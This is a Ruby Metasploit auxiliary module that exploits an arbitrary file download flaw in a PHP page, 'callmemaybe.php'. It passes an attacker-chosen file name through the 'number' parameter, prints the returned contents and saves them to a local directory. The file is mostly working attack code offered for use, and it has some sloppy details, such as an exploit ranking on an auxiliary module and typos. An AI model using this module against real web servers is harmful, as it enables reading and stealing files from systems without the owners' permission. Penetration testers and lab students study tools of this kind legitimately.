require 'msf/core'
require 'open-uri'

class MetasploitModule < Msf::Auxiliary
	Rank = ExcellentRanking
	include Msf::Exploit::Remote::HttpClient

	def initialize
		super('Name' => 'Simple auxiliary module',
			'Description' => 'This module downloads abritary files from a webserver',
			'Author' => 'Silvio Ciavarrella',
			'Platform' => 'php',
			'License' => MSF_LICENSE,
			'Privileged' => false,
			'Targets' =>
			[ [ 'Automatic Target', { }] ])

			register_options(
				[
					Opt::RPORT(80),
					OptString.new('FILE', [true, 'file to be downloaded from the web server', '']),
					OptString.new('DOWNLOAD_PATH', [true, 'where the file will be stored on the host system', '/tmp'])
				], self.class
			)
			deregister_options('Proxies', 'SSL', 'VHOST')
	end

	def download(path)
		download = open("http://#{datastore['RHOSTS']}#{path}")
		if !download.blank?
				print_good("download succesfull")
		else
				print_bad("download failed at #{download}")
				return
		end
		download_path = "#{datastore['DOWNLOAD_PATH']}"
		download_path << '/' if download_path[-1, 1] != '/'
		download_path << "downloaded_file.txt"
		print_good("file is stored in #{download_path}")
		IO.copy_stream(download, "#{download_path}")
	end

	def run
		webroot = target_uri.path
		webroot << '/' if webroot[-1, 1] != '/'
		path = "#{webroot}callmemaybe.php?number=#{datastore['FILE']}"
		print_status("downloading file #{datastore['FILE']}")
		res = send_request_cgi({
			'method' => 'GET',
			'uri' => path
		})
		if res.code == 200
			if res.body === ""
				print_bad("Empty response from the HTTP body")
				return
			else
				print_good("#{res.body}")
			end
		else
			print_bad("does not work #{res.body}")
			return
	end
		print_status("initialize download")
		download(path)
end
end
